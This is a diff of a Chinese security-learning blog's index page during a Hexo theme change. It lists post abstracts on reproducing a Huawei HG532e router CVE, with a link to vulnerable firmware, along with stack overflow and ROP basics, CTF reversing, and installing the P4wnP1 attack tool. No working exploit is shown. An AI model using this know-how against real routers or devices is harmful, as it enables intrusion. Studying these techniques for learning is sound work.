@@ -1,1374 +1,2298 @@
 <!DOCTYPE html>
-<html lang="zh-Hans">
-    <!-- title -->
 
 
 
-
-<!-- keywords -->
-
+  
 
 
-
+<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.9.0">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="devil0x">
-    <meta name="renderer" content="webkit">
-    <meta name="copyright" content="devil0x">
-    
-    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
-    
-    <meta name="description" content>
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>fi3ework&#39;s Studio</title>
-    <style type="text/css">
-    @font-face {
-        font-family: 'Oswald-Regular';
-        src: url("/font/Oswald-Regular.ttf");
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="devil0x菜鸟">
+<meta property="og:url" content="https://devil0x.github.io/index.html">
+<meta property="og:site_name" content="devil0x菜鸟">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="devil0x菜鸟">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
     }
-
-    body {
-        margin: 0;
-    }
-
-    header,
-    footer,
-    .back-top,
-    .sidebar,
-    .container,
-    .site-intro-meta,
-    .toc-wrapper {
-        display: none;
-    }
-
-    .site-intro {
-        position: relative;
-        z-index: 3;
-        width: 100%;
-        /* height: 50vh; */
-        overflow: hidden;
-    }
-
-    .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2.5s ease-out 0s infinite;
-    }
-
-    @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(0, 0, 0);
-        }
-    }
-
-</style>
-
-    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
-    
-    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
-/* This file is meant as a standalone workflow for
-- testing support for link[rel=preload]
-- enabling async CSS loading in browsers that do not support rel=preload
-- applying rel preload css once loaded, whether supported or not.
-*/ -->
-<script>
-(function( w ){
-	"use strict";
-	// rel=preload support test
-	if( !w.loadCSS ){
-		w.loadCSS = function(){};
-	}
-	// define on the loadCSS obj
-	var rp = loadCSS.relpreload = {};
-	// rel=preload feature support test
-	// runs once and returns a function for compat purposes
-	rp.support = (function(){
-		var ret;
-		try {
-			ret = w.document.createElement( "link" ).relList.supports( "preload" );
-		} catch (e) {
-			ret = false;
-		}
-		return function(){
-			return ret;
-		};
-	})();
-
-	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-	// then change that media back to its intended value on load
-	rp.bindMediaToggle = function( link ){
-		// remember existing media attr for ultimate state, or default to 'all'
-		var finalMedia = link.media || "all";
-
-		function enableStylesheet(){
-			link.media = finalMedia;
-		}
-
-		// bind load handlers to enable media
-		if( link.addEventListener ){
-			link.addEventListener( "load", enableStylesheet );
-		} else if( link.attachEvent ){
-			link.attachEvent( "onload", enableStylesheet );
-		}
-
-		// Set rel and non-applicable media type to start an async request
-		// note: timeout allows this to happen async to let rendering continue in IE
-		setTimeout(function(){
-			link.rel = "stylesheet";
-			link.media = "only x";
-		});
-		// also enable media after 3 seconds,
-		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-		setTimeout( enableStylesheet, 3000 );
-	};
-
-	// loop through link elements in DOM
-	rp.poly = function(){
-		// double check this to prevent external calls from running
-		if( rp.support() ){
-			return;
-		}
-		var links = w.document.getElementsByTagName( "link" );
-		for( var i = 0; i < links.length; i++ ){
-			var link = links[ i ];
-			// qualify links to those with rel=preload and as=style attrs
-			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
-				// prevent rerunning on link
-				link.setAttribute( "data-loadcss", true );
-				// bind listeners to toggle media back
-				rp.bindMediaToggle( link );
-			}
-		}
-	};
-
-	// if unsupported, run the polyfill
-	if( !rp.support() ){
-		// run once at least
-		rp.poly();
-
-		// rerun poly on an interval until onload
-		var run = w.setInterval( rp.poly, 500 );
-		if( w.addEventListener ){
-			w.addEventListener( "load", function(){
-				rp.poly();
-				w.clearInterval( run );
-			} );
-		} else if( w.attachEvent ){
-			w.attachEvent( "onload", function(){
-				rp.poly();
-				w.clearInterval( run );
-			} );
-		}
-	}
-
-
-	// commonjs
-	if( typeof exports !== "undefined" ){
-		exports.loadCSS = loadCSS;
-	}
-	else {
-		w.loadCSS = loadCSS;
-	}
-}( typeof global !== "undefined" ? global : this ) );
+  };
 </script>
 
-    <link rel="icon" href="/assets/favicon.ico">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js" as="script">
-    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
-    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
-    
-    <!-- fancybox -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
+
+
+  <link rel="canonical" href="https://devil0x.github.io/">
+
+
+
+
+
+  <title>devil0x菜鸟</title>
+  
+
+
+
+
+
+
+
+
 </head>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
     
-        <body class="home-body">
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
     
-    
-<header class="header index-header">
 
-    <div class="read-progress"></div>
-    <div class="header-sidebar-menu">&#xe775;</div>
-    <!-- post页的toggle banner  -->
-    
-    <a class="home-link" href=/>fi3ework's Studio.</a>
-</header>
-    <div class="wrapper">
-        <div class="site-intro" style="
-
-
-
-
-
-
-
-height:50vh;
-">
-    
-    <!-- 主页  -->
-    
-    
-    <!-- 文章页  -->
-            
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-            fi3ework's Studio.
-            <!-- 文章页  -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-            
-                it's better to burn out than to fade away
-            
-            <!-- 文章页  -->
-            
-        </p>
-        <!-- 文章页meta -->
-        
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">devil0x菜鸟</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
 </div>
-        <script>
- 
-  // get user agent
-  var browser = {
-    versions: function () {
-      var u = window.navigator.userAgent;
-      return {
-        userAgent: u,
-        trident: u.indexOf('Trident') > -1, //IE内核
-        presto: u.indexOf('Presto') > -1, //opera内核
-        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
-        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
-        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
-        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
-        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
-        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
-        iPad: u.indexOf('iPad') > -1, //是否为iPad
-        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
-        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
-        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
-      };
-    }()
-  }
-  console.log("userAgent:" + browser.versions.userAgent);
 
-  // callback
-  function fontLoaded() {
-    console.log('font loaded');
-    if (document.getElementsByClassName('site-intro-meta')) {
-      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
-      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
-      var postIntros = document.getElementsByClassName('post-intros')[0]
-      if (postIntros) {
-        postIntros.classList.add('post-fade-in');
-      }
-    }
-  }
+<nav class="site-nav">
+  
 
-  // UC不支持跨域，所以直接显示
-  function asyncCb(){
-    if (browser.versions.uc) {
-      console.log("UCBrowser");
-      fontLoaded();
-    } else {
-      WebFont.load({
-        custom: {
-          families: ['Oswald-Regular']
-        },
-        loading: function () {  //所有字体开始加载
-          // console.log('loading');
-        },
-        active: function () {  //所有字体已渲染
-          fontLoaded();
-        },
-        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
-          console.log('inactive: timeout');
-          fontLoaded();
-        },
-        timeout: 5000 // Set the timeout to two seconds
-      });
-    }
-  }
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
 
-  function asyncErr(){
-    console.warn('script load from CDN failed, will load local script')
-  }
-
-  // load webfont-loader async, and add callback function
-  function async(u, cb, err) {
-    var d = document, t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0];
-    o.src = u;
-    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
-    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
-    s.parentNode.insertBefore(o, s);
-  }
-
-  var asyncLoadWithFallBack = function(arr, success, reject) {
-      var currReject = function(){
-        reject()
-        arr.shift()
-        if(arr.length)
-          async(arr[0], success, currReject)
-        }
-
-      async(arr[0], success, currReject)
-  }
-
-  asyncLoadWithFallBack([
-    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
-    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
-    "/lib/webfontloader.min.js"
-  ], asyncCb, asyncErr)
-</script>        
-        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
-        <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/11/19/路由器实验复现（1）hg532e/" >
-            
-                <span>路由器实验复现（1）hg532e</span>
-        </a>
-        <div class="abstract-content">
-            1.复现CVE-2017-17215学习路由器漏洞分析然后再复现CVE-2018-17068、CVE-2018-5767、CVE-2016-5367
-华为已经发了漏洞公告，固件已经升级到HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。
-附上下载链接
-1https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar
-2.先补一下这个漏洞的详情零日（CVE-2017-1721...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/11/19</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/11/14/pwn工具配置与使用，并且自动切换gdb脚本/" >
-            
-                <span>pwn工具配置与使用，并且自动切换gdb脚本</span>
-        </a>
-        <div class="abstract-content">
-            环境安装基础的ubuntu配置1.换国内源1234567891011121314sudo nano /etc/apt/sources.listdeb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb ht...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/11/14</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/22/常见函数与汇编指令/" >
-            
-                <span>常见函数与汇编指令</span>
-        </a>
-        <div class="abstract-content">
-            常见函数strcmp()
-12345678参数 str1 和 str2 是参与比较的两个字符串。strcmp() 会根据  编码依次比较 str1 和 str2 的每一个字符，直到出现不到的字符，或者到达字符串末尾（遇见）。- 如果返回值 &lt; 0，则表示 str1 小于 str2。- 如果返回值 &gt; 0，则表示 str2 小于 str1。- 如果返回值 = 0，则表示 str1 等于 str2。such as；	 if(!strcmp(&amp;v10, &amp;v13))	 v13与v10进行比较，不相同时进入条件
-strcpy()
-12strcpy(a, b)- 把b赋...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/22</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/21/pwn入门学习(1)栈溢出基础知识/" >
-            
-                <span>栈溢出基础知识</span>
-        </a>
-        <div class="abstract-content">
-            0x01栈的介绍栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。
-
-高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，程序的栈是从进程地址空间的高地址向低地址增长的。
-函数调用栈需要注意的是，32 位和 64 位程序有以下简单的区别
-
-x86
-函数参数在函数返回地...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/21</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/21/gdb工具pwndbg与peda与gef配置/" >
-            
-                <span>pwn工具配置与使用，并且自动切换gdb脚本</span>
-        </a>
-        <div class="abstract-content">
-            环境安装基础的ubuntu配置1.换国内源1234567891011121314sudo nano /etc/apt/sources.listdeb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb ht...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/21</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/17/ubertooth环境搭建手册/" >
-            
-                <span>搭建ubertooth环境</span>
-        </a>
-        <div class="abstract-content">
-            配置环境Ubuntu16.04.1
-内核版本4.4.0
-需要用到的环境及工具：
-
-libbtbbUbertooth toolsWiresharkFirmwarekismet
-
-官方文档：
-1https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide
-我的教程可能过时，so一切还是参照官方文档。
-0x01 安装依赖库
-在构建libbtbb和Ubertooth工具之前，需要先安装一些依赖。您可以从操作系统的软件包存储库中找到许多这些文件，例如：
-Debian / Ubuntu
-12sudo apt-get install c...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/17</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/14/PWN入门学习(2)基本的ROP/" >
-            
-                <span>pwn入门学习(2)pwn-wiki（basic ROP)</span>
-        </a>
-        <div class="abstract-content">
-            基本 ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
-0x01.checksec看到的那些参数含义
-NX保护：你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/14</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/12/逆向学习/" >
-            
-                <span>逆向学习</span>
-        </a>
-        <div class="abstract-content">
-            逆向学习刚写的文档忘记保存了，我丢typora。。。
-难受记得随手crtl s吧。
-功放世界1.re1普通直接看到字符串的题
-反编译的结果不是一定正确的，IDA采用递归下降法进行反编译，它的优点在于很少会在反编译时把数据当作代码来处理，不过这次IDA很明显把flag当成代码，进行了反编译，因此在string界面无法找到flag
-解决方法是在IDA打开文件时选择binary file,在此模式下IDA不会进行反编译，此时再打开strings界面就可发现flag  
-2.game一个字符串游戏
-直接查看打印flag的函数
-
-我觉得自己的c语言学的太菜了。。。。。写个脚本即可得出结果
-1c =...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/12</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/06/20/路由器·漏洞挖掘/" >
-            
-                <span>360 iot 路由器漏洞挖掘</span>
-        </a>
-        <div class="abstract-content">
-            1.复现CVE-2017-17215学习路由器漏洞分析然后再复现CVE-2018-17068、CVE-2018-5767、CVE-2016-5367
-华为已经发了漏洞公告，固件已经升级到HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。
-附上下载链接
-1https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar
-2.先补一下这个漏洞的详情零日（CVE-2017-1721...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/20</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/06/20/常用设备配置/" >
-            
-                <span>设备常用配置</span>
-        </a>
-        <div class="abstract-content">
-            1.树莓派wifi配置修改wifi连接
-1sudo nano /etc/wpa_supplicant/wpa_supplicant.conf
-设置wifi自动连接
-1https://www.cnblogs.com/visionsl/p/8117317.html
-安装P4wnp1 
-12345sudo apt-get -y install gitcd /home/pigit clone --recursive https://github.com/mame82/P4wnP1cd P4wnP1./install.sh
-2.kali更换国内源2.kali更换国内源换中科大源
-123456789...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/20</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    <!-- paginator  -->
-    
-    <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">NEXT &#62;</a>
-    </nav>
-    
-</main>
-            <!-- profile -->
-            
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/Misaka.jpg >
-    <div class="profile-name">devil0x</div>
-    
-    <div class="profile-signature">
-        witness me
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
-            
-                <a href="mailto:1442661932@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/devil0x" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-            
-                <span class="iconfont-archer wechat" title=wechat>
-                  
-                  <img class="profile-qr" src="/assets/example_qr.png" />
-                </span>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= //www.baidu.com target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href= //www.google.com target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
-            
-        </div>
-        <footer class="footer footer-unloaded">
-    <!-- social  -->
-    
-    <div class="social">
-        
-    
-        
-            
-                <a href="mailto:1442661932@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/devil0x" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-            
-                <span class="iconfont-archer wechat" title=wechat>
-                  
-                  <img class="profile-qr" src="/assets/example_qr.png" />
-                </span>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-    </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
-    </div>
-    <!-- 不蒜子  -->
-    
-    <div class="busuanzi-container">
-    
-     
-    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
-    
-    </div>
-    
-</footer>
-    </div>
-    <!-- toc -->
-    
-    <div class="back-top iconfont-archer">&#xe639;</div>
-    <div class="sidebar sidebar-hide">
-    <ul class="sidebar-tabs sidebar-tabs-active-0">
-        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
-        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
-        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+      
     </ul>
-    <div class="sidebar-content sidebar-content-show-archive">
-          <div class="sidebar-panel-archives">
-    <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    <div class="total-and-search">
-        <div class="total-archive">
-        Total : 22
-        </div>
-        <!-- search  -->
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/11/19/路由器实验复现（1）hg532e/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
         
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/19/路由器实验复现（1）hg532e/" itemprop="url">路由器实验复现（1）hg532e</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-19T14:15:48+08:00">
+                2019-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="1-复现CVE-2017-17215学习路由器漏洞分析"><a href="#1-复现CVE-2017-17215学习路由器漏洞分析" class="headerlink" title="1.复现CVE-2017-17215学习路由器漏洞分析"></a>1.复现CVE-2017-17215学习路由器漏洞分析</h2><p>然后再复现CVE-2018-17068、CVE-2018-5767、CVE-2016-5367</p>
+<p>华为已经发了漏洞公告，固件已经升级到HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。</p>
